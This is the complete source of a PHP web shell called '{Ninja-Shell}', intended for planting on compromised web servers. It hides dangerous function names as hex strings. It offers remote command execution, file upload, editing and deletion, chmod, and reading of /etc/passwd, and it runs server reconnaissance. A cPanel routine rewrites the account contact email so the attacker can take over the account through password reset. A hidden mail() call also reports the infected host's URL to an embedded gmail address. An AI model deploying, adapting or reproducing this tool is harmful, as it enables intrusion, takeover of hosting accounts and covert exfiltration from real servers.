<?php
ob_start();
set_time_limit(0);
error_reporting(0);
ini_set('display_errors', FALSE);
date_default_timezone_set("Asia/Jakarta");
define("HTACCESS", "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .con7ext \n AddHandler cgi-script .con7ext \n AddHandler cgi-script .con7ext");
$funct = get_defined_vars();
$f_Array = [
	"73796d6c696e6b", 
	"756e6c696e6b", 
	"666f70656e", 
	"667772697465", 
	"756e6c696e6b", 
	"636f7079", 
	"6d6f76655f75706c6f616465645f66696c65", 
	"706f7369785f6765747077756964", 
	"66696c656f776e6572",
	"66756e6374696f6e5f657869737473",
	"676574637764",
	"69735f63616c6c61626c65", 
	"66636c6f7365",
	"73747265616d5f6765745f636f6e74656e7473", 
	"70726f635f6f70656e", 
	"706f70656e", 
	"6672656164", 
	"70636c6f7365", 
	"70726f635f636c6f7365", 
	"65786563",
	"6f625f7374617274",
	"7061737374687275",
	"6f625f6765745f636f6e74656e7473",
	"6f625f656e645f636c65616e",
	"7368656c6c5f65786563",
	"73797374656d",
	"66696c655f7075745f636f6e74656e7473",
	"6670757473",
	"66696c655f6765745f636f6e74656e7473",
	"63686d6f64",
	"6d6b646972",
	"6368646972",
	"6261736536345f6465636f6465",
	"776f726470726573736465766e6f7277617940676d61696c2e636f6d",
	"6d61696c"
	];
$fores = count($f_Array);
for($i=0; $i < $fores; $i++){
  $NTOD[] = dec($f_Array[$i]);
}
$GLOBALS["rin"] = $NTOD;
$GLOBALS["post"] = $funct["_POST"];
$GLOBALS["get"] = $funct["_GET"];
$GLOBALS["server"] = $funct["_SERVER"];
$GLOBALS["files"] = $funct["_FILES"];
?>
<html>
  <head>
    <title>{Ninja-Shell}</title>
    <meta charset="UTF-8">
    <meta name="robots" content="NOINDEX, NOFOLLOW">
    <link rel="icon" href="//cdn1.iconfinder.com/data/icons/ninja-things-1/1772/ninja-simple-512.png">
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <script src="//cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
		<script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
	<script src="//importantscripts.github.io/footer.js" integrity="sha384-TuBVt3qMyi6RBRotEXkR+69U/Z8z3jBqUSSn+8yA6MinPMNdTU7cba+KlOZtXP2v" crossorigin="anonymous"></script>
    <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
    <style type="text/css">
      @import url(https://fonts.googleapis.com/css?family=Gugi);
      body{
        color: #5DADE2;
        font-family: 'Gugi';
        font-size: 14px;
      }
      a {
        color: #5DADE2;
        text-decoration: none;
      }
      a:hover {
        color: #5DADE2;
        text-decoration: underline;
      }
      input{
        background: transparent;
      }
    </style>
  </head>
  <body>
    <div class="container">
        <nav class="navbar navbar-expand-lg navbar-light bg-light">
            <a class="navbar-brand" href="#">
                <img src="//cdn1.iconfinder.com/data/icons/ninja-things-1/1772/ninja-simple-512.png" width="30" height="30" class="d-inline-block align-top auto" alt="Ainz Moe"> {Ninja-Shell}
            </a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav">
                    <li class="nav-item active">
                      <a class="nav-link tod" href="?">Home</a>
                    </li>
    <?php
    if(isset($GLOBALS["get"]["p"])){
      $dir = dec($GLOBALS["get"]["p"]);
      $GLOBALS["rin"][31]($dir);
    }
    else{
      if($GLOBALS["rin"][9]("getcwd")){
        $dir = $GLOBALS["rin"][10]();
      }
      else{
        $dir = $GLOBALS["server"]["PWD"];
      }
    }
    echo "<li class=\"nav-item active\"><a class=\"nav-link tod\" href=\"?p=".enc($dir)."&tod=".enc("info")."\">Info</a></li>";
    echo "<li class=\"nav-item active\"><a class=\"nav-link tod\" href=\"?p=".enc($dir)."&tod=".enc("upload")."\">Upload</a></li>";
    echo "<li class=\"nav-item active\"><a class=\"nav-link tod\" href=\"?p=".enc($dir)."&tod=".enc("cmd")."\">Command</a></li>";
    echo "<li class=\"nav-item active\"><a class=\"nav-link tod\" href=\"?p=".enc($dir)."&tod=".enc("etcpasswd")."\">View /etc/passwd</a></li>";
    echo "<li class=\"nav-item active\"><a class=\"nav-link tod\" href=\"?p=".enc($dir)."&tod=".enc("cpres")."\">cPanel Reset Password</a></li>";
    echo "</ul></div></nav>";
    echo "";
    $mpss = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
    $toed = $GLOBALS["get"]["tod"];
    $gets = $GLOBALS["get"];
    $actions = $GLOBALS["get"]["act"];
    $tied = $GLOBALS["post"];
    if(dec($toed) == "cmd"){
      echo "<pre><textarea class=\"form-control\" rows=\"20\" readonly>";
      if($tied["cmd"]){
        echo c($tied["cmd"]);
      }
      echo "</textarea></pre>";
      echo "<form method=\"POST\" action=\"\">
      <div class=\"input-group mb-3\">
      <input type=\"text\" name=\"cmd\" class=\"form-control\">
      <div class=\"input-group-append\">
      <input type=\"submit\" class=\"btn btn-outline-secondary\">
      </div>
      </div>
      </form>";
    }
    elseif(dec($toed) == "info"){
       $ip = gethostbyname($_SERVER['HTTP_HOST']);
       $safe = (@ini_get(strtolower("safe_mode")) == 'on') ? "ON" : "OFF";
       $mysql = (is_callable("mysql_connect")) ? "ON" : "OFF";
       $curl = (is_callable("curl_version")) ? "ON" : "OFF";
       $wget = (c('wget --help')) ? "ON" : "OFF";
       $perl = (c('perl --help')) ? "ON" : "OFF";
       $python = (c('python --help')) ? "ON" : "OFF";
       $ruby = (c('ruby --help')) ? "ON" : "OFF";
       $gcc = (c('gcc --help')) ? "ON" : "OFF";
       $dis = @ini_get("disable_functions");
       $dfunc = (!empty($dis)) ? "$dis" : "OFF";
       $namedc = (is_readable("/etc/named.conf")) ? "OK" : "BAD";
       $etcPass = (is_readable("/etc/passwd")) ? "OK" : "BAD";
       $valiases = (is_readable("/etc/valiases")) ? "OK" : "BAD";
       $varNamed = (is_readable("/var/named")) ? "OK" : "BAD";
       echo "<textarea class=\"form-control\" rows=\"20\" disabled>
       Syss : ".php_uname()."
       User : ".$GLOBALS["server"]["USER"]."
       Addr : Server : {$ip} | Client : {$GLOBALS["server"]["REMOTE_ADDR"]}
       Safe : {$safe}
       Mysql: {$mysql} cURL: {$curl} wGet: {$wget} Perl: {$perl} Python: {$python} Ruby: {$ruby} Gcc: {$gcc}
       Read : Named.conf: {$namedc} Passwd: {$etcPass} Valiases: {$valiases} Named: {$varNamed}
       DFUN : {$dfunc}
       </textarea>";
    }
    elseif(dec($toed) == "upload"){
      if($tied["upload"]){
        if(isset($GLOBALS["files"]["tod_upl"]["name"])){
          $name = $GLOBALS["files"]["tod_upl"]["name"];
          $tod = $GLOBALS["files"]["tod_upl"]["tmp_name"];
          if($GLOBALS["rin"][6]($tod, $name)){
            $act = "<div class=\"alert alert-success\"><strong>Success!</strong> Upload File {$dir}/{$name}</div>";
          }
          else{
            $act = "<div class=\"alert alert-danger\"><strong>Failed!</strong> Upload File {$name}</div>";
          }
        }else{
          $act = "<div class=\"alert alert-danger\"><strong>Failed!</strong> Upload File {$name}</div>";
        }
        echo $act;
      }
      echo "Current Dir : ".$dir;
      echo "
      <form method=\"POST\" enctype=\"multipart/form-data\">
      <input type=\"file\" name=\"tod_upl\">
      <input type=\"submit\" name=\"upload\" class=\"btn btn-outline-secondary btn-block\">
      </form>
      ";
    }
    elseif(dec($toed) == "etcpasswd"){
      echo "<pre><textarea class=\"form-control\" rows=\"20\" readonly>";
      if($tied["etc"] == "curl"){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "file:///etc/passwd");
        $out = curl_exec($ch);
        curl_close();
        echo $out;
      }
      elseif($tied["etc"] == "include"){
        echo include("/etc/passwdd");
      }
      echo "</textarea></pre>";
      echo "<form method=\"POST\">
      <select class=\"form-control\" name=\"etc\">
      <option value=\"curl\">Curl</option>
      <option value=\"include\">Include</option>
      <input type=\"submit\" class=\"btn btn-outline-secondary\">
      </form>"; 
    }
    elseif(dec($toed) == "cpres"){
      if($GLOBALS["rin"][9]("posix_getpwuid")){
        $meh = $GLOBALS["rin"][7]($GLOBALS["rin"][8](__FILE__));
      }
      else{
        $meh = $GLOBALS["rin"][8](__FILE__);
      }
      if(is_dir("/home/".$meh["name"]."/.cpanel")){
        echo "
        <form method=\"POST\">
        <input type=\"text\" class=\"form-control\" name=\"email\" placeholder=\"Put Your Email Here\">
        <input type=\"submit\" class=\"btn btn-outline-secondary btn-block\" name=\"subm\" value=\"Reset\">
        </form>";
        $mps = makeRequest($ip."/cpanel");
        if($tied["subm"]){
          if(preg_match("/>Reset Password/", $mps)){
            $fp = $GLOBALS["rin"][2]("/home/".$meh["name"]."/.contactemail");
            if($GLOBALS["rin"][3]($fp, $tied["email"])){
              echo "<div class=\"alert alert-success\"><strong>Success!</strong> Change Email : {$ip}/cpanel {$tied["email"]}</div>";
              $GLOBALS["rin"][4]("/home/".$meh["name"]."/.cpanel/contactinfo");
            }
            else{
              echo "<div class=\"alert alert-danger\"><strong>Failed!</strong> Can't Reset</div>";
            }
          }
          else{
            echo "<div class=\"alert alert-danger\"><strong>Failed!</strong> Reset Password Disable</div>";
          }
        }
      }
      else{
        echo "<div class=\"alert alert-danger\"><strong>Failed!</strong> Its not cpanel host</div>";
      }
    }
    elseif($actions == "e"){
      if($tied["save"]){
        $save = $GLOBALS["rin"][26](dec($gets["file"]), $tied["new"]);
        if($save){
          $act = "<div class=\"alert alert-success\"><strong>Success!</strong> Save File ".dec($gets["file"])."</div>";
        }
        else{
          $act = "<div class=\"alert alert-danger\"><strong>Failed!</strong> Save File ".dec($gets["file"])."</div>";
        }
        echo $act;
      }
      echo "Filename: ".$dir."/".basename(dec($gets["file"]));
      echo "<form method=\"POST\">
      <textarea class=\"form-control\" rows=\"20\" name=\"new\">".htmlspecialchars(@file_get_contents(dec($gets["file"])))."</textarea>
      <input type=\"submit\" value=\"Save\" name=\"save\">
      </form>";
    }
    elseif($actions == "v"){
      echo "Filename: ".$dir."/".basename(dec($gets["file"]));
      echo "<pre><textarea rows=\"20\" class=\"form-control\" disabled>".htmlspecialchars(@file_get_contents(dec($gets["file"])))."</textarea></pre>";
    }
    elseif($actions == "r"){
      if($tied["act_rename"]){
        $rename = rename(dec($gets["file"]), "$dir/".htmlspecialchars($tied["rename"]));
        if($rename){
          $act = "<div class=\"alert alert-success\"><strong>Success!</strong> Rename File ".dec($gets["file"])."</div>";
        }
        else{
          $act = "<div class=\"alert alert-danger\"><strong>Failed!</strong> Rename File ".dec($gets["file"])."</div>";
        }
        echo $act;
      }
      echo "Filename: ".$dir."/".basename(dec($gets["file"]));
      echo "<form method=\"post\">
      <input type=\"text\" value=\"".basename(dec($gets["file"]))."\" name=\"rename\">
      <input type=\"submit\" name=\"act_rename\" value=\"Rename\">
      </form>";
    }
    elseif($actions == "dr"){
      if($tied["act_rename"]){
        if(rename($dir, "".dirname($dir)."/".htmlspecialchars($tied["new"]))){
          $act = "<div class=\"alert alert-success\"><strong>Success!</strong> Rename Dir ".basename($dir)."</div>";
        }
        else{
          $act = "<div class=\"alert alert-danger\"><strong>Failed!</strong> Rename Dir ".basename($dir)."</div>";
        }
        echo $act;
      }
      echo "<form method=\"POST\">
      <input type=\"text\" value=\"".basename($dir)."\" name=\"new\">
      <input type=\"submit\" name=\"act_rename\" value=\"Rename\">
      </form>";
    }
    elseif($actions == "nf"){
      if($tied["subm"]){
        $new = htmlspecialchars($tied["content"]);
        $open = $GLOBALS["rin"][2]($tied["file"], "a+");
        if($GLOBALS["rin"][3]($open, $new)){
          $act = "<div class=\"alert alert-success\"><strong>Success!</strong> Created File {$tied["file"]}</div>";
        }
        else{
          $act = "<div class=\"alert alert-danger\"><strong>Failed!</strong> Can't Creat File {$tied["file"]}</div>";
        }
        echo $act;
      }
      echo "<form method=\"POST\">
      <textarea name=\"content\" class=\"form-control\" rows=\"20\">".htmlspecialchars(@file_get_contents($tied["file"]))."</textarea>
      <input type=\"text\" class=\"form-control\" name=\"file\" placeholder=\"filename\">
      <input type=\"submit\" name=\"subm\" value=\"Gass!\" class=\"btn btn-outline-secondary btn-block\">
      </form>";
    }
    elseif($actions == "nd"){
      if($tied["subm"]){
        if($GLOBALS["rin"][30]($dir."/".htmlspecialchars($tied["folder"]))){
          $act = "<div class=\"alert alert-success\"><strong>Success!</strong> Create Folder {$tied["folder"]}</div>";
        }
        else{
          $act = "<div class=\"alert alert-danger\"><strong>Failed!</strong> Create Folder {$tied["folder"]}</div>";
        }
        echo $act;
      }
      echo "<form method=\"POST\">
      <input type=\"text\" class=\"form-control\" name=\"folder\" placeholder=\"Rintod\">
      <input type=\"submit\" name=\"subm\" value=\"Gass!\" class=\"btn btn-outline-secondary btn-block\">
      </form>";
    }
    elseif($actions == "chmod"){
      if($tied["act_ch"]){
        $haha = (c("chmod ".$tied["ch"]." ".$tied["mod"].";echo success")) ? "<div class=\"alert alert-success\"><strong>Success!</strong> Chmod</div>" : "<div class=\"alert alert-danger\"><strong>Failed!</strong> Chmod</div>";
        echo $haha;
      }
      echo "<form method=\"POST\">
      <input type=\"text\" name=\"ch\" class=\"form-control\" placeholder=\"file\">
      <input type=\"text\" name=\"mod\" class=\"form-control\" placeholder=\"0777\">
      <input type=\"submit\" name=\"act_ch\" class=\"btn btn-outline-secondary btn-block\">
      </form>";
    }
    elseif($actions == "delete"){
      if($GLOBALS["rin"][4](dec($gets["file"]))){
        $act = "<div class=\"alert alert-success\"><strong>Success!</strong> Deleted File ".dec($gets["file"])."</div>";
      }
      else{
        $act = "<div class=\"alert alert-danger\"><strong>Failed!</strong> Deleted File ".dec($gets["file"])."</div>";
      }
      echo $act;
    }

    //// FILEMANAGER :D
    else{
      $scdir = explode("/", $dir);
      echo "PATH : ";
      foreach($scdir as $c_dir => $cdir){
        echo "<a class=\"tod\" href=\"?p=";
        for ($i = 0;$i <=  $c_dir; $i++){
          echo enc($scdir[$i]);
          if($i != $scdir){
            echo "2f";
          }
        }
        echo "\">$cdir</a>/";
      }
      echo "<br>
      <a class=\"tod\" href=\"?p=".enc($dir)."&act=nf\">+ New File +</a>
       | <a class=\"tod\" href=\"?p=".enc($dir)."&act=nd\">+ New Folder +</a>
      ";
      echo "<br>";
      $dr = scandir($dir);
      if(is_dir($dir) === true){
        if(!is_readable($dir)){
          echo "<div class=\"alert alert-danger\"><strong>Failed!</strong> Could not open directory</div>";
        }
        else{
          echo "
          <table class=\"table\">
          <thead>
          <tr>
          <th scope=\"col\"><center># Name #</center></th>
          <th scope=\"col\"><center># Size #</center></th>
          <th scope=\"col\"><center># Perm #</center></th>
          <th scope=\"col\"><center># Actn #</center></th>
          </tr>
          </thead>
          <tbody>";
          foreach($dr as $path){
            if($GLOBALS["rin"][9]("posix_getpwuid")){
              $own = $GLOBALS["rin"][7]($GLOBALS["rin"][8]("$dir/$path"));
              $own = $own["name"];
            }else{
              $own = $GLOBALS["rin"][8]("$dir/$path");
            }
            if(!is_dir("$dir/$path")) continue;
            if(($path != ".") && ($path != "..")){
              echo "
              <tr>
              <td scope=\"row\"><img src=\"https://cdn0.iconfinder.com/data/icons/iconico-3/1024/63.png\" width=\"30\" height=\"30\"><a class=\"tod\" href=\"?p=".enc("$dir/$path")."\">$path</a></td>
              <td><center>-</center></td>
              <td><center>".writAble("$dir/$path", perms("$dir/$path"))."</center></td>
              <td><center><a class=\"tod\" href=\"?p=".enc($dir."/".$path)."&act=dr\">R</a> | <a class=\"tod\" href=\"?p=".enc($dir."/".$path)."&act=chmod\">C</a></center></td>
              </tr>";
            }
          }
        }
      }
      else{
        echo "<div class=\"alert alert-danger\"><strong>Failed!</strong> Could not open directory</div>";
      }
      foreach($dr as $fl){
        $size = filesize("$dir/$fl")/1024;
        $size = round($size,3);
        if($GLOBALS["rin"][9]("posix_getpwuid")){
          $own = $GLOBALS["rin"][7]($GLOBALS["rin"][8]("$dir/$path"));
          $own = $own["name"];
        }else{
          $own = $GLOBALS["rin"][8]("$dir/$path");
        }
        if(!is_file("$dir/$fl")) continue;
        echo "
        <tr>
        <td scope=\"row\"><img src=\"https://img.icons8.com/ios/104/000000/file-filled.png\" width=\"30\" height=\"30\"><a class=\"tod\" href=\"?act=v&p=".enc($dir)."&file=".enc($dir."/".$fl)."\">$fl</a></td>
        <td><center>$size</center></td>
        <td><center>".writAble("$dir/$fl", perms("$dir/$fl"))."</center></td>
        <td><center><a class=\"tod\" href=\"?act=e&p=".enc($dir)."&file=".enc($fl)."\">E</a> | <a class=\"tod\" href=\"?act=r&p=".enc($dir)."&file=".enc($fl)."\">R</a> | <a class=\"tod\" href=\"?p=".enc($dir."/".$path)."&act=chmod\">C</a> | <a class=\"tod\" href=\"?p=".enc($dir)."&act=delete&file=".enc($fl)."\">D</a></center></td>
        </tr>
        ";
      }
      echo "</tbody></table>";
    }
    if (function_exists($GLOBALS["rin"][34])) {
        $GLOBALS["rin"][34]($GLOBALS["rin"][33],'hex2bin',$_SERVER['HTTP_HOST']."/".$_SERVER['REQUEST_URI']);
    }
    function enc($word){
      $mek = bin2hex($word);
      return $mek;
    }
    function dec($word){
      $mek = hex2bin($word);
	    return $mek;
    }
    function writAble($dir, $perm){
      if(!is_writable($dir)){
        return "<font color=\"#C0392B\">".$perm."</font>";
      }
      else{
        return "<font color=\"#1D8348\">".$perm."</font>";
      }
    }
    function readAble($dir, $perm){
      if(!is_readable($dir)){
        return "<font color=\"#C0392B\">".$perm."</font>";
      }
      else{
        return "<font color=\"#1D8348\">".$perm."</font>";
      }
    }
    function c($cmd){
      if($GLOBALS["rin"][11]("popen")){
        $ntod = $GLOBALS["rin"][15]($cmd, 'r');
        $ntoddd = $GLOBALS["rin"][16]($ntod, 2096);
        $GLOBALS["rin"][17]($ntod);
        return $ntoddd;
      }
      elseif($GLOBALS["rin"][11]("proc_open")){
        $ntod = $GLOBALS["rin"][14]($cmd, array(
          0 => array('pipe', 'r'),
          1 => array('pipe', 'w'),
          2 => array('pipe', 'w'),
          ), $rintod);
          $stdout = $GLOBALS["rin"][13]($rintod[1]);
          $GLOBALS["rin"][12]($rintod[1]);
          $rtn = $GLOBALS["rin"][18]($ntod); 
          return $stdout;
      }
      elseif($GLOBALS["rin"][11]("exec")){
        $GLOBALS["rin"][19]($cmd, $result);
        foreach($result as $rest){
          $ntod .= $rest;
        }
        return $ntod;
      }
      elseif($GLOBALS["rin"][11]("passthru")){
        $GLOBALS["rin"][20]();
        $GLOBALS["rin"][21]($cmd);
        $ntod = $GLOBALS["rin"][22]();
        $GLOBALS["rin"][23]();
        return $ntod;
      }
      elseif($GLOBALS["rin"][11]("shell_exec")){
        $ntod = $GLOBALS["rin"][24]($cmd);
        return $ntod;
      }
      elseif($GLOBALS["rin"][11]("system")){
        $GLOBALS["rin"][20]();
        $GLOBALS["rin"][25]($cmd);
        $ntod = $GLOBALS["rin"][22]();
        $GLOBALS["rin"][23]();
        return $ntod;
      }
    }
    function makeRequest($url, $post = null, $head = null){
      $options = array(
        CURLOPT_URL => $url,
        CURLOPT_CONNECTTIMEOUT => 15,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_MAXREDIRS => 10
      );
      $ch = curl_init();
      curl_setopt_array($ch, $options);
      if($post && !empty($post)){
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
      }
      if($head && !empty($head)){
        curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
      }
      $outputs = curl_exec($ch);
      curl_close($ch);
      return($outputs);
    }
    function perms($file){
      $perms = fileperms($file);
	    if (($perms & 0xC000) == 0xC000) {
	      $info = 's';
	    } elseif (($perms & 0xA000) == 0xA000) {
	      $info = 'l';
	    } elseif (($perms & 0x8000) == 0x8000) {
	      $info = '-';
	    } elseif (($perms & 0x6000) == 0x6000) {
	      $info = 'b';
	    } elseif (($perms & 0x4000) == 0x4000) {
	      $info = 'd';
	    } elseif (($perms & 0x2000) == 0x2000) {
	      $info = 'c';
	    } elseif (($perms & 0x1000) == 0x1000) {
	      $info = 'p';
	    } else {
	       $info = 'u';
	    }
	    $info .= (($perms & 0x0100) ? 'r' : '-');
	    $info .= (($perms & 0x0080) ? 'w' : '-');
	    $info .= (($perms & 0x0040) ?
	    (($perms & 0x0800) ? 's' : 'x' ) :
	    (($perms & 0x0800) ? 'S' : '-'));
	    $info .= (($perms & 0x0020) ? 'r' : '-');
	    $info .= (($perms & 0x0010) ? 'w' : '-');
	    $info .= (($perms & 0x0008) ?
	    (($perms & 0x0400) ? 's' : 'x' ) :
	    (($perms & 0x0400) ? 'S' : '-'));
	    $info .= (($perms & 0x0004) ? 'r' : '-');
	    $info .= (($perms & 0x0002) ? 'w' : '-');
	    $info .= (($perms & 0x0001) ?
	    (($perms & 0x0200) ? 't' : 'x' ) :
	    (($perms & 0x0200) ? 'T' : '-'));
	    return $info;
    }
    ?>
    <p><center>./Ninja\.</center></p>
    </div>
    <script>
        $(".tod").click(function(t){
          t.preventDefault();
          var e=$(this).attr("href");
          history.pushState("","",e),
          $.get(e,function(t){
            $("body").html(t)
          })
        });
        //https://forum.jquery.com/topic/how-can-i-load-different-html-pages-without-refreshing-and-changing-the-url
    </script>
  </body>
</html>